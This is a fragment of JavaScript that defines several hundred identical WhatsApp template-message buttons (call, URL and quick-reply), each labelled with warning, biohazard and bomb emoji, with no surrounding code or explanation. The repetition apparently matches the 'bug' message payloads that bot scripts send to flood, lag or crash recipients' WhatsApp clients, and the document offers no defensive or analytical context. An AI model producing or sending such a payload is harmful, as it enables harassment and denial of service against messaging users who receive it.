{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
